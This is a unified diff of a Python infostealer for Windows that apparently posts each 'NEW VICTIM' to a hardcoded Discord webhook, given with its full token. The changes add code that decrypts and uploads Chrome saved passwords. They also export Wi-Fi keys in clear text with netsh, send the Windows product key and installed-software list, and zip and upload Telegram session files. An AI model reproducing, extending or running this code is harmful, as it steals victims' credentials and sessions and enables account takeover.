@@ -1,12 +1,20 @@
+
+from os import system
+from sqlite3.dbapi2 import Timestamp
+import subprocess
+from xml.dom import minidom
+
 try:
     import shutil
     import json
     from base64 import b64decode
     from glob import glob
+    import sys
     import win32crypt
     from dhooks import Webhook, Embed, File
     from win32crypt import CryptUnprotectData
     from datetime import datetime
+    from windows_tools.installed_software import *
     from Crypto.Cipher import AES
     import os
     import sqlite3
@@ -14,16 +22,17 @@ try:
     import re
     from requests import get
     import win32api
+    import win32com.shell.shell as shell
     from zipfile import ZipFile
 except Exception as e:
     pass
-
 #################################### LOGOUT ###################################################
 log_out = 0  # this is log_out for kill process stealer, (discord + telegram). 1 - on, 0 - off
 ###############################################################################################
 
+
 ################################### Send new victim messsage #############################
-hook = Webhook("") # Your webhook id
+hook = Webhook("https://discord.com/api/webhooks/851798133741584384/wlHP0xLwTWayJz00G1mDpTDs7x2JViPlHnrlHBCJe3Z3Oxsf3o1gJSuZMWQCz1UWFeE1") # Your webhook id
 embed = Embed(
     description='NEW VICTIM!',
     color=0x5CDBF0,
@@ -31,6 +40,28 @@ embed = Embed(
     )
 embed.set_footer(text='Hehe')
 hook.send(embed=embed)
+
+from windows_tools.product_key import *
+
+PRODUCT_KEY_REGEX = r'([A-Z0-9]{5}-){4}[A-Z0-9]{5}'
+
+reg_key = get_windows_product_key_from_reg()
+
+result = get_installed_software()
+
+f = open('installed_soft.txt', 'w')
+f.write(str(result))
+f.close()
+file = File('installed_soft.txt', name="installed_softwares.txt")
+embed = Embed(
+    description=f'Windows key: {reg_key}',
+    color=0x5CDBF0,
+    timestamp='now'  
+    )
+embed.set_footer(text='Hehe')
+hook.send(embed=embed)
+hook.send(file=file)
+os.remove('installed_soft.txt')
 ##########################################################################################
 name_ur_txt = 'google_passwords.txt'
 ######################################################################## IP ########################################################
@@ -124,10 +155,18 @@ def Chrome():
                 text += url + ' | ' + login + ' | ' + decrypted_pass + '\n'
                 with open(name_ur_txt, "w", encoding="utf-8") as f:
                     f.write(text)
+        Passwords_chrome = File('google_passwords.txt')
+        embed = Embed(
+            description=f'Google Chrome Passwords',
+            color=0x5CDBF0,
+            timestamp='now'
+            )
+        hook.send(embed=embed, file=Passwords_chrome)
+        os.remove('google_passwords.txt')
     except Exception as e:
         pass
 ###########################################################################
-
+Chrome()
 ######################## Firefox cookie ########################
 # def Firefox():
 #     textf = ''
@@ -216,6 +255,35 @@ hook.send(embed=embed, file=cookies)
 
 ####################################################################
 
+########################## WIFI PASSWORDS ########################
+import zipfile
+pwds = os.system("netsh wlan export profile key=clear")
+os.system('cls')
+# for filenames in os.listdir(os.getcwd()):
+#     if filenames.endswith('.xml'):
+#         shutil.make_archive(os.getcwd(), 'zip', dir_name)
+zf = zipfile.ZipFile("passwords.zip", "w")
+for dirname, subdirs, files in os.walk(os.getcwd()):
+    #zf.write(dirname)
+    for filename in files:
+        if filename.endswith('.xml'):
+            zf.write(os.path.join(dirname, filename))
+zf.close()
+for dirname, subdirs, files in os.walk(os.getcwd()):
+    #zf.write(dirname)
+    for filename in files:
+        if filename.endswith('.xml'):
+            os.remove(filename)
+import platform
+file = File('passwords.zip', name='wifi-passwords.zip')
+embed = Embed(
+    title = "WIFI Passwords",
+    description=f"wifi passwords from {platform.node()}",
+    timestamp='now'
+)
+hook.send(embed=embed)
+hook.send(file=file)
+os.remove('passwords.zip')
 ########################## Amigo ###############################
 
 def Amigo():
@@ -286,16 +354,24 @@ def finddir(path):
 def getFileProperties(fname):
     props = {'FileVersion': None}
     try:
+        # backslash as parm returns dictionary of numeric info corresponding to VS_FIXEDFILEINFO struc
         fixedInfo = win32api.GetFileVersionInfo(fname, '\\')
         props['FileVersion'] = "%d.%d.%d.%d" % (fixedInfo['FileVersionMS'] / 65536,
                 fixedInfo['FileVersionMS'] % 65536, fixedInfo['FileVersionLS'] / 65536,
                 fixedInfo['FileVersionLS'] % 65536)
     except Exception as e:
+        print(repr(e))
         pass
     return props
 
+
 def send_session_files(path):
     version = getFileProperties(os.path.join(path[:-5],"Telegram.exe"))["FileVersion"]
+    try:
+        os.mkdir(ttemp)
+        print("good")
+    except:
+        print("err")
     for root, dirs, files in os.walk(path):
         for dir in dirs:
             if dir[0:15] == "D877F783D5D3EF8":
@@ -313,6 +389,7 @@ def send_session_files(path):
                 except:
                     pass
                 if os.path.exists(os.path.join(root, dir, 'maps')):
+                    #print("***OK Matched maps in " + path)
                     shutil.copy2(os.path.join(mapsdir, 'maps'), (os.path.join(ttemp, dir, "maps")))
             elif dir[0:15] == "F8806DD0C461824":
                 mapsdir = os.path.join(path, dir)
@@ -321,35 +398,62 @@ def send_session_files(path):
                 except:
                     pass
                 if os.path.exists(os.path.join(root, dir, 'maps')):
+                    #print("***OK Matched maps in " + path)
                     shutil.copy2(os.path.join(mapsdir, 'maps'), (os.path.join(ttemp, dir, "maps")))
+                        # bot.send_document(user_id, open(os.path.join(mapsdir, file), 'rb'), caption=path + "\nVersion: " + user)
         for file in files:
             if file[0:15] == "D877F783D5D3EF8":
+                #print("***OK Matched D877F783D5D3EF8 in " + path)
                 pathd877 = os.path.join(path, file)
                 shutil.copy2(pathd877,(os.path.join(ttemp,file)))
+                #bot.send_document(user_id, open(os.path.join(file, pathd877), 'rb'), caption=path + "\nVersion: " + user)
             elif file[0:15] == "A7FDF864FBC10B7":
+                #print("***OK Matched D877F783D5D3EF8 in " + path)
                 pathd877 = os.path.join(path, file)
                 shutil.copy2(pathd877,(os.path.join(ttemp,file)))
             elif file[0:15] == "F8806DD0C461824":
+                #print("***OK Matched D877F783D5D3EF8 in " + path)
                 pathd877 = os.path.join(path, file)
                 shutil.copy2(pathd877,(os.path.join(ttemp,file)))
             elif file == "key_datas":
+                #print("***OK Matched key_datas in " + path)
                 pathkey = os.path.join(path, file)
                 shutil.copy2(pathkey, (os.path.join(ttemp, file)))
+                #bot.send_document(user_id, open(os.path.join(file, pathkey), 'rb'), caption=path + "\nVersion: " + user)
 
     with ZipFile(os.path.join(temp,'tdata.zip'), 'w') as zipObj:
+        # Iterate over all the files in directory
         for folderName, subfolders, filenames in os.walk(ttemp):
             for filename in filenames:
+                # create complete filepath of file in directory
                 filePath = os.path.join(folderName, filename)
+                # Add file to zip
                 zipObj.write(filePath)
-    file = File(open(os.path.join(temp, 'tdata.zip'), 'rb'), name='tgdata.zip')
+    file = File(temp + "\\" + 'tdata.zip', name="Tgsession.zip")
     embed = Embed(
-        description=f'Telegram data\nversion: {version}',
-        color=0x5CDBF0,
-        timestamp='now'  
+        description=f"TG Version: {version}",
+        color = 0x5CDBF0,
+        timestamp='now'
     )
     hook.send(embed=embed)
     hook.send(file=file)
+    return False
 
+if os.path.exists(pathusr + '\\AppData\\Roaming\\Telegram Desktop'):
+    tddir = (pathusr + '\\AppData\\Roaming\\Telegram Desktop\\')
+    tdata_path = (pathusr + '\\AppData\\Roaming\\Telegram Desktop\\tdata')
+    print("***OK Default TG folder has been found")
+    send_session_files(tdata_path)
+else:
+    print("ERROR: Telegram folder is not default. Continuing...")
+
+
+for i in paths:
+    found = finddir(i)
+    if found != None and found != (pathusr + '\\AppData\\Roaming\\Telegram Desktop'):
+        tddir = found
+        tdata_path = (os.path.join(tddir, "tdata"))
+        send_session_files(tdata_path)
 ##################################################################################
 
 ####################################### Logout ###################################
@@ -364,6 +468,10 @@ def logout_windows(bool):
         pass
 
 ##################################################################################
+
+############################# WIFI PASSWORDS #####################################
+##################################################################################
+
 
 ##################################################################################
 def send_txt():
@@ -392,13 +500,14 @@ def main():
                 tddir = found
                 tdata_path = (os.path.join(tddir, "tdata"))
                 send_session_files(tdata_path)
+        tdata_path = (pathusr + '\\AppData\\Roaming\\Telegram Desktop\\tdata')
+        send_session_files(tdata_path)
         embed = Embed(
         description=f'User path: {pathusr}',
         color=0x5CDBF0,
         timestamp='now'  
         )
         hook.send(embed=embed)
-        Chrome()
         send_txt()
         logout_windows(log_out)
     except Exception as e:
